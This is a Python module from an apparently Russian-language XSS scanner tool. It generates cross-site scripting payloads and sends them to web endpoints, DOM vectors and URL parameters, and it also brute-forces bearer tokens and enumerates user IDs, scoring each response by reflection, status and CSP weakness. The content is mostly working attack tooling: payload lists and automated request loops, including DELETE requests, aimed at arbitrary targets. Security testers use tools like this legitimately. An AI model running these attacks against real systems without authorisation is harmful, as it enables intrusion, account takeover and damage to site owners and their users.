# xss_security_gui/auto_modules/dom_and_endpoints.py
"""
DOM & Endpoint Attacks — ULTRA 9.0

- Уніфікована модель результатів
- Стійкі мережеві запити (timeouts, errors)
- Кореляція DOM-векторів з CSP
- Автоматичний генератор XSS‑payload'ів
- Чиста архітектура, готова до Threat Intel
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Iterable
import re
import requests
from urllib.parse import urljoin


# ============================================================
#  Payload generator
# ============================================================

def generate_xss_payloads(context: str | None = None) -> List[str]:
    """
    Автоматический генератор XSS‑payload'ов.
    context: "attr", "html", "url", "dom" — влияет на форму пейлоада.
    """
    base = [
        "<img src=x onerror=alert(1)>",
        "\"'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]

    attr_payloads = [
        "\" onmouseover=alert(1) x=\"",
        "' autofocus onfocus=alert(1) '",
    ]

    url_payloads = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    dom_payloads = [
        "#<img src=x onerror=alert(1)>",
        "#</script><script>alert(1)</script>",
    ]

    if context == "attr":
        return base + attr_payloads
    if context == "url":
        return base + url_payloads
    if context == "dom":
        return base + dom_payloads
    return base + attr_payloads + url_payloads + dom_payloads


# ============================================================
#  CSP correlation helpers
# ============================================================

def _parse_csp(csp_header: str) -> Dict[str, List[str]]:
    """
    Примитивный парсер CSP: разбивает по директивам и источникам.
    Возвращает dict: {directive: [sources...]}.
    """
    result: Dict[str, List[str]] = {}
    if not csp_header:
        return result

    for part in csp_header.split(";"):
        part = part.strip()
        if not part:
            continue
        pieces = part.split()
        if not pieces:
            continue
        directive, *sources = pieces
        result[directive.lower()] = sources
    return result


def _csp_allows_inline_script(csp_header: str) -> bool:
    """
    Проверяет, разрешены ли inline‑скрипты по CSP.
    """
    csp = _parse_csp(csp_header)
    script_src = csp.get("script-src") or csp.get("default-src") or []
    if not script_src:
        # Нет явного запрета — считаем, что inline потенциально возможен
        return True
    if "'unsafe-inline'" in script_src:
        return True
    return False


def _csp_allows_eval_like(csp_header: str) -> bool:
    """
    Проверяет, разрешены ли eval/new Function по CSP (unsafe-eval).
    """
    csp = _parse_csp(csp_header)
    script_src = csp.get("script-src") or csp.get("default-src") or []
    return "'unsafe-eval'" in script_src


def _csp_risk_for_dom_vector(vector: str, csp_header: str) -> str:
    """
    Коррелирует DOM‑вектор с CSP и возвращает риск:
    - "high"  — CSP не защищает от данного вектора
    - "medium" — частичная защита
    - "low"   — CSP явно блокирует типичный сценарий
    """
    if not csp_header:
        return "high"

    allows_inline = _csp_allows_inline_script(csp_header)
    allows_eval = _csp_allows_eval_like(csp_header)

    v = vector.lower()

    if v in ("settimeout", "setinterval", "postmessage"):
        if allows_eval:
            return "high"
        return "medium"

    if v in ("window.name", "location.hash"):
        if allows_inline:
            return "high"
        return "medium"

    return "medium"


# ============================================================
#  Internal helpers
# ============================================================

def _safe_request(method: str, url: str, payload: Any = None, timeout: int = 5):
    """Безопасный HTTP-запрос с защитой от всех ошибок."""
    try:
        start = time.time()

        method = method.upper()
        if method == "GET":
            r = requests.get(url, params=payload, timeout=timeout)
        elif method == "POST":
            r = requests.post(url, data=payload, timeout=timeout)
        elif method == "PUT":
            r = requests.put(url, data=payload, timeout=timeout)
        elif method == "DELETE":
            r = requests.delete(url, timeout=timeout)
        else:
            return None, 0.0

        elapsed = (time.time() - start) * 1000.0
        return r, elapsed

    except Exception as e:
        return e, 0.0


def _reflects(payload: str, text: str) -> bool:
    """Проверка отражения XSS-пейлоада."""
    if not text:
        return False
    return payload in text[:20000]


# ============================================================
#  JS Endpoint Attacks
# ============================================================

def attack_found_targets(
    engine,
    scripts: Iterable[Dict[str, Any]],
    payloads: List[str] | None = None,
    methods: List[str] | None = None,
):
    payloads = payloads or generate_xss_payloads("url")
    methods = methods or ["GET", "POST", "PUT", "DELETE"]

    engine._log("🔍 Запуск атак по найденным JS-эндпоинтам...")

    for script in scripts:
        if not isinstance(script, dict):
            engine._log(f"⚠️ Пропущен некорректный JS-объект: {script}", level="warn")
            continue

        fetches = (script.get("fetch_calls") or []) + (script.get("ajax_calls") or [])
        for endpoint in fetches:
            if not endpoint:
                continue

            if not str(endpoint).startswith("http"):
                endpoint = urljoin(engine.domain, endpoint)

            for method in methods:
                for payload in payloads:
                    r, elapsed = _safe_request(method, endpoint, payload)

                    if isinstance(r, Exception) or r is None:
                        engine._record_result("endpoint_attack", {
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "error": str(r),
                            "severity": "error",
                        })
                        continue

                    reflected = _reflects(payload, r.text or "")
                    severity = "high" if reflected else "low"

                    engine._record_result("endpoint_attack", {
                        "endpoint": endpoint,
                        "method": method,
                        "payload": payload,
                        "status": r.status_code,
                        "elapsed_ms": elapsed,
                        "reflected": reflected,
                        "response_size": len(r.content or b""),
                        "severity": severity,
                    })


# ============================================================
#  DOM Vector Attacks + CSP correlation
# ============================================================

def attack_dom_vectors(
    engine,
    scripts: Iterable[Dict[str, Any]],
    dom_payloads: Dict[str, str] | None = None,
    csp_header: str | None = None,
):
    """
    DOM‑атаки с учётом CSP:
    - dom_payloads: карта {vector: url/payload}
    - csp_header: строка CSP для корреляции риска
    """
    dom_payloads = dom_payloads or {
        "setTimeout": f"{engine.domain}#alert(1)",
        "setInterval": f"{engine.domain}#alert(1)",
        "window.name": "javascript:window.name='<img src=x onerror=alert(1)>'",
        "location.hash": f"{engine.domain}#<img src=x onerror=alert(1)>",
        "postMessage": "window.postMessage('alert(1)', '*');",
    }

    engine._log("🚀 DOM атака началась...")

    csp_header = csp_header or ""
    for script in scripts:
        if not isinstance(script, dict):
            continue

        sensitive = script.get("xss_sensitive") or []
        for vector in sensitive:
            payload_url = dom_payloads.get(vector)
            if not payload_url:
                continue

            r, elapsed = _safe_request("GET", payload_url)

            if isinstance(r, Exception) or r is None:
                engine._record_result("dom_vector_attack", {
                    "vector": vector,
                    "url": payload_url,
                    "error": str(r),
                    "severity": "error",
                    "csp": csp_header,
                    "csp_risk": _csp_risk_for_dom_vector(vector, csp_header),
                })
                continue

            reflected = "alert(1)" in ((r.text or "")[:20000])
            base_severity = "high" if reflected else "low"
            csp_risk = _csp_risk_for_dom_vector(vector, csp_header)

            # Итоговая оценка: если CSP слабый и есть отражение — high без вариантов
            if reflected and csp_risk == "high":
                severity = "high"
            elif reflected and csp_risk == "medium":
                severity = "high"
            elif not reflected and csp_risk == "high":
                severity = "medium"
            else:
                severity = base_severity

            engine._record_result("dom_vector_attack", {
                "vector": vector,
                "url": payload_url,
                "status": r.status_code,
                "elapsed_ms": elapsed,
                "reflected": reflected,
                "severity": severity,
                "csp": csp_header,
                "csp_risk": csp_risk,
            })


# ============================================================
#  Header Generator
# ============================================================

def build_headers_list(tokens):
    headers_set = [
        {},
        {"X-API-Key": "XSS-KEY"},
        {"Authorization": "Bearer XSS-Token"},
        {"Cookie": "session=XSSSESSION"},
        {"Cookie": "auth=XSSAUTH"},
        {"Cookie": "jwt=XSS-JWT"},
    ]

    for token in tokens:
        if isinstance(token, dict):
            name = token.get("name") or token.get("header") or "X-Token"
            value = token.get("value") or "XSS-Test"
            headers_set.append({name: value})
        elif isinstance(token, str):
            headers_set.append({token: "XSS-Test"})

    return headers_set


# ============================================================
#  API Endpoint Attacks
# ============================================================

def attack_api_endpoints(engine, session, base_url, endpoints, headers_list, log_func):
    log_func("🔷 API Endpoint Attacks...")

    for ep in endpoints:
        url = urljoin(base_url, ep)

        for headers in headers_list:
            try:
                r = session.get(url, headers=headers, timeout=5)
                reflected = "alert" in ((r.text or "")[:20000])
                severity = "high" if reflected else "low"

                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "status": r.status_code,
                    "headers": headers,
                    "severity": severity,
                })

            except Exception as e:
                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "error": str(e),
                    "severity": "error",
                })


# ============================================================
#  Token Brute Force
# ============================================================

def attack_tokens(engine, session, base_url, token_candidates, log_func):
    log_func("🔷 Token Brute Force...")

    for token in token_candidates:
        try:
            r = session.get(
                base_url,
                headers={"Authorization": f"Bearer {token}"},
                timeout=5,
            )
            severity = "high" if r.status_code == 200 else "low"

            engine._record_result("token_attack", {
                "token": token,
                "status": r.status_code,
                "severity": severity,
            })

        except Exception as e:
            engine._record_result("token_attack", {
                "token": token,
                "error": str(e),
                "severity": "error",
            })


# ============================================================
#  Parameter Attacks
# ============================================================

def attack_parameters(engine, session, base_url, parameters, log_func):
    log_func("🔷 Parameter Attacks...")

    payload = "<script>alert(1)</script>"

    for param in parameters:
        try:
            r = session.get(base_url, params={param: payload}, timeout=5)
            reflected = payload in (r.text or "")
            severity = "high" if reflected else "low"

            engine._record_result("param_attack", {
                "param": param,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity,
            })

        except Exception as e:
            engine._record_result("param_attack", {
                "param": param,
                "error": str(e),
                "severity": "error",
            })


# ============================================================
#  User ID Attacks
# ============================================================

def attack_user_ids(engine, session, base_url, user_ids, log_func):
    log_func("🔷 User ID Attacks...")

    for uid in user_ids:
        try:
            r = session.get(f"{base_url}/user/{uid}", timeout=5)
            severity = "high" if r.status_code == 200 and "profile" in (r.text or "").lower() else "low"

            engine._record_result("user_attack", {
                "user_id": uid,
                "status": r.status_code,
                "severity": severity,
            })

        except Exception as e:
            engine._record_result("user_attack", {
                "user_id": uid,
                "error": str(e),
                "severity": "error",
            })


# ============================================================
#  XSS Target Attacks
# ============================================================

def attack_xss_targets(engine, session, base_url, xss_targets, log_func):
    log_func("🔷 XSS Target Attacks...")

    payload = "<img src=x onerror=alert(1)>"

    for target in xss_targets:
        url = urljoin(base_url, target)

        try:
            r = session.get(url, params={"q": payload}, timeout=5)
            reflected = payload in (r.text or "")
            severity = "high" if reflected else "low"

            engine._record_result("xss_target_attack", {
                "target": target,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity,
            })

        except Exception as e:
            engine._record_result("xss_target_attack", {
                "target": target,
                "error": str(e),
                "severity": "error",
            })

def ai_suggest_payloads_from_context(
    context_snippets: Iterable[str],
    hint: str | None = None,
) -> List[str]:
    """
    AutoPayload AI‑генератор (эвристический, без внешних сервисов).

    - Анализирует куски JS/HTML/DOM
    - Ищет паттерны: innerHTML, eval, location, hash, JSON, templates
    - На основе этого подбирает XSS‑пейлоады под контекст
    """
    base: List[str] = []

    joined = "\n".join(s or "" for s in context_snippets).lower()

    # Базовые пейлоады
    base.extend(generate_xss_payloads())

    # Если есть innerHTML / outerHTML / insertAdjacentHTML
    if any(k in joined for k in ["innerhtml", "outerhtml", "insertadjacenthtml"]):
        base.extend(generate_xss_payloads("html"))

    # Если есть location / hash / search
    if any(k in joined for k in ["location", "hash", "search", "query"]):
        base.extend(generate_xss_payloads("url"))

    # Если есть eval / new Function / setTimeout / setInterval
    if any(k in joined for k in ["eval(", "new function", "settimeout", "setinterval"]):
        base.extend(generate_xss_payloads("dom"))

    # Если есть шаблоны типа {{var}} или ${var}
    if re.search(r"\{\{.*?\}\}", joined) or "${" in joined:
        base.append("{{<img src=x onerror=alert(1)>}}")
        base.append("${alert(1)}")

    # Если есть JSON.parse / stringify
    if "json.parse" in joined or "json.stringify" in joined:
        base.append('"}];alert(1);//')
        base.append('"},"x":"<img src=x onerror=alert(1)>"}')

    # Дополнительный hint от движка (например: "attr", "url", "dom")
    if hint:
        base.extend(generate_xss_payloads(hint))

    # Убираем дубликаты, сохраняем порядок
    seen = set()
    result: List[str] = []
    for p in base:
        if p not in seen:
            seen.add(p)
            result.append(p)

    return result

